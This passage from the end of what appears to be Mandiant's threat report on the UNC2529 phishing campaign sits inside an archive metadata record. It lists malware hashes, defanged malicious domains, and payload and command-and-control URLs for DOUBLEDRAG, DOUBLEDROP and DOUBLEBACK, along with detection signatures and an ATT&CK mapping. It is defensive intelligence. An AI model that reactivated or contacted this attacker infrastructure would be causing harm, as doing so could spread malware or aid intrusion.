well\nresourced. The identified wide-ranging targets, across geography and industry suggests a\nfinancial crime motive.\n\nDOUBLEBACK appears to be an ongoing work in progress and Mandiant anticipates further\nactions by UNC2529 to compromise victims across all industries worldwide.\n\n**Technical Indicators**\n\nDOUBLEDRAG / BIFF8\n\n_Files_\n\n**MD5** **Role** **Wave**\n\n39fc804566d02c35f3f9d67be52bee0d DOUBLEDRAG 1st\n\n\n44f7af834ee7387ac5d99a676a03cfdd DOUBLEDRAG 1st\n\n\n-----\n\n4e5583e34ad54fa7d1617f400281ba56 PDF Decoy 1st\n\ne80dc4c3e26deddcc44e66bb19b6fb58 PDF Decoy 1st\n\n\n169c4d96138d3ff73097c2a9aab5b1c0 Zip 1st\n\ne70502d020ba707095d46810fd32ee49 Zip 1st\n\n\n62fb99dc271abc104504212157a4ba91 Excel BIFF8 macro 2nd\n\n1d3fcb7808495bd403973a0472291da5 PDF Decoy 2nd\n\n\n6a1da7ee620c638bd494f4e24f6f1ca9 Zip 2nd\n\n\na28236b43f014c15f7ad4c2b4daf1490 Zip 2nd\n\nd594b3bce66b8b56881febd38aa075fb Zip 2nd\n\n_Domains_\n\n**Dec. 2, 2020 Wave** **Dec. 11 to 18, 2020 Wave**\n\nadupla[.]net aibemarle[.]com\n\nceylonbungalows[.]net bestwalletforbitcoin[.]com\n\nchandol[.]com bitcoinsacks[.]com\n\nclosetdeal[.]com digitalagencyleeds[.]com\n\ndaldhillon[.]com erbilmarriott[.]com\n\ndesmoncreative[.]com ethernetpedia[.]com\n\nfarmpork[.]com fileamazon[.]com\n\n\n-----\n\ngemralph[.]com gamesaccommodationscotland[.]com\n\nisjustlunch[.]com greathabibgroup[.]com\n\nlogicmyass[.]com infomarketx[.]com\n\nlottoangels[.]com jagunconsult[.]com\n\nmangoldsengers[.]com khodaycontrolsystem[.]com\n\noconeeveteransmemorial[.]com maninashop[.]com\n\nscottishhandcraft[.]com onceprojects[.]com\n\nseathisons[.]com simcardhosting[.]com\n\nskysatcam[.]com stayzarentals[.]com\n\nsmartnhappy[.]com touristboardaccommodation[.]com\n\nstepearn[.]com towncentrehotel[.]com\n\nsugarmummylove[.]com vacuumcleanerpartsstore[.]com\n\ntechooze[.]com zmrtu[.]com\n\ntigertigerbeads[.]com\n\ntotallyhealth-wealth[.]com\n\ntowncenterhotel[.]com\n\nuaeworkpermit[.]com\n\nDOUBLEDROP\n\n_MD5_\n\n\n-----\n\n4b32115487b4734f2723d461856af155\n9e3f7e6697843075de537a8ba83da541\ncc17e0a3a15da6a83b06b425ed79d84c\n\n_URLs_\n\nhxxp://p-leh[.]com/update_java.dat\nhxxp://clanvisits[.]com/mini.dat\nhxxps://towncentrehotels[.]com/ps1.dat\n\nDOUBLEBACK\n\n_MD5_\n\n1aeecb2827babb42468d8257aa6afdeb\n1bdf780ea6ff3abee41fe9f48d355592\n1f285e496096168fbed415e6496a172f\n6a3a0d3d239f04ffd0666b522b8fcbaa\nce02ef6efe6171cd5d1b4477e40a3989\nfa9e686b811a1d921623947b8fd56337\n\n_URLs_\n\nhxxps://klikbets[.]net/admin/client.php\nhxxps://lasartoria[.]net/admin/client.php\nhxxps://barrel1999[.]com/admin4/client.php\nhxxps://widestaticsinfo[.]com/admin4/client.php\nhxxps://secureinternet20[.]com/admin5/client.php\nhxxps://adsinfocoast[.]com/admin5/client.php\n\n**Detections**\n\nFireEye detects this activity across our platforms. The following contains specific detection\nnames that provide an indicator of exploitation or post-exploitation activities we associate\nwith UNC2529.\n\n**Platforms** **Detection Name**\n\n\n-----\n\nNetwork Security\n\nEmail Security\n\nDetection On Demand\n\nMalware File Scanning\n\nMalware File Storage\nScanning\n\n\nFEC_Trojan_JS_DOUBLEDRAG_1 (static)\nFE_Trojan_JS_DOUBLEDRAG_1 (static)\nDownloader.DOUBLEDRAG (network)\nDownloader.JS.DOUBLEDRAG.MVX (dynamic)\nFE_Dropper_PS1_DOUBLEDROP_1 (static)\nFEC_Dropper_PS1_DOUBLEDROP_1 (static)\nDropper.PS1.DOUBLEDROP.MVX (dynamic)\nFE_Backdoor_Win_DOUBLEBACK_1 (static)\nFE_Backdoor_Win_DOUBLEBACK_2 (static)\nFE_Backdoor_Win_DOUBLEBACK_3 (static)\nFE_Backdoor_Win_DOUBLEBACK_4 (static)\nBackdoor.Win.DOUBLEBACK (network)\nMalware.Binary.xls\n\n\nEndpoint Security _Real-Time (IOC)_\n\nPOWERSHELL ENCODED REMOTE DOWNLOAD\n(METHODOLOGY)\nSUSPICIOUS POWERSHELL USAGE (METHODOLOGY)\nMALICIOUS SCRIPT CONTENT A (METHODOLOGY)\nPOWERSHELL INVOCATION FROM REGISTRY\nARTIFACT (METHODOLOGY)\n\n_Malware Protection (AV/MG)_\n\nGeneric.mg.1aeecb2827babb42\nGeneric.mg.1bdf780ea6ff3abe\nGeneric.mg.1f285e496096168f\nGeneric.mg.6a3a0d3d239f04ff\nGeneric.mg.ce02ef6efe6171cd\nGeneric.mg.fa9e686b811a1d92\nTrojan.JS.Agent.TZP\nGen:Variant.Ulise.150277\nGen:Variant.Ulise.150283\nGen:Variant.Razy.799918\n\n**UNC2529 MITRE ATT&CK Mapping**\n\n**ATT&CK Tactic Category** **Techniques**\n\nResource Development [Compromise Infrastructure (TT1584)](https://attack.mitre.org/techniques/T1584)\n[Develop Capabilities (T1587)](https://attack.mitre.org/techniques/T1587)\n\n[Digital Certificates (T1587.003)](https://attack.mitre.org/techniques/T1587/003)\n[Obtain Capabilities (T1588)](https://attack.mitre.org/techniques/T1588)\n\n[Digital Certificates (T1588.004)](https://attack.mitre.org/techniques/T1588/004)\n\n\n-----\n\nInitial Access [Phishing (T1566)](https://attack.mitre.org/techniques/T1566/)\n\n[Spearphishing Link (T1566.002)](https://attack.mitre.org/techniques/T1566/002/)\n\nExecution [User Execution (T1204)](https://attack.mitre.org/techniques/T1204/)\n\n[Malicious Link (T1204.001)](https://attack.mitre.org/techniques/T1204/001/)\n[Command and Scripting Interpreter (T1059)](https://attack.mitre.org/techniques/T1059)\n\n[Visual Basic (T1059.005)](https://attack.mitre.org/techniques/T1059/005)\n[JavaScript/JScript (T1059.007)](https://attack.mitre.org/techniques/T1059/007)\n\nPrivilege Escalation [Process Injection (T1055)](https://attack.mitre.org/techniques/T1055)\n\nDefense Evasion [Indicator Removal on Host (T1070)](https://attack.mitre.org/techniques/T1070)\n\n[File Deletion (T1070.004)](https://attack.mitre.org/techniques/T1070/004)\n[Obfuscated Files or Information (T1027)](https://attack.mitre.org/techniques/T1027)\n[Process Injection (T1055)](https://attack.mitre.org/techniques/T1055)\n[Modify Registry (T1112)](https://attack.mitre.org/techniques/T1112)\n\nDiscovery [System Owner/User Discovery (T1033)](https://attack.mitre.org/techniques/T1033)\n[Process Discovery (T1057)](https://attack.mitre.org/techniques/T1057)\n[System Information Discovery (T1082)](https://attack.mitre.org/techniques/T1082)\n[Account Discovery (T1087)](https://attack.mitre.org/techniques/T1087)\n[Software Discovery (T1518)](https://attack.mitre.org/techniques/T1518)\n\nCollection [Screen Capture (T1113)](https://attack.mitre.org/techniques/T1113)\n[Archive Collected Data (T1560)](https://attack.mitre.org/techniques/T1560)\n\n[Archive via Utility (T1560.001)](https://attack.mitre.org/techniques/T1560/001)\n\nCommand and Control [Application Layer Protocol (T1071)](https://attack.mitre.org/techniques/T1071)\n\n[Web Protocols (T1071.001)](https://attack.mitre.org/techniques/T1071/001)\n[Asymmetric Cryptography (T1573.002)](https://attack.mitre.org/techniques/T1573/002)\n\n**Acknowledgements**\n\nThank you to Tyler McLellan, Dominik Weber, Michael Durakovich and Jeremy Kennelly for\ntechnical review of this content. In addition, thank you to Nico Paulo Yturriaga and Evan\nReese for outstanding signature creation, and Ana Foreman for graphics support.\n\n\n-----",
    "language": "EN",
    "sources": [
        {
            "id": "05d7b179-7656-44d8-a74c-9ab34d3df3a2",
            "created_at": "2023-01-12T14:38:44.599904Z",
            "updated_at": "2023-01-12T14:38:44.599904Z",
            "deleted_at": null,
            "name": "VXUG",
            "url": "https://www.vx-underground.org",
            "description": "vx-underground Papers",
            "reports": null
        }
    ],
    "references": [
        "https://papers.vx-underground.org/papers/Malware Defense/Malware Analysis 2021/2021-05-04 - The UNC2529 Triple Double- A Trifecta Phishing Campaign.pdf"
    ],
    "report_names": [
        "2021-05-04 - The UNC2529 Triple Double- A Trifecta Phishing Campaign.pdf"
    ],
    "threat_actors": [],
    "ts_created_at": 1673536124,
    "ts_updated_at": 1743041125,
    "ts_creation_date": 1653762118,
    "ts_modification_date": 1653762118,
    "files": {
        "pdf": "https://archive.orkl.eu/c2a4d6e46d496fa0885320b84e3b8db4b7771841.pdf",
        "text": "https://archive.orkl.eu/c2a4d6e46d496fa0885320b84e3b8db4b7771841.txt",
        "img": "https://archive.orkl.eu/c2a4d6e46d496fa0885320b84e3b8db4b7771841.jpg"
    }
}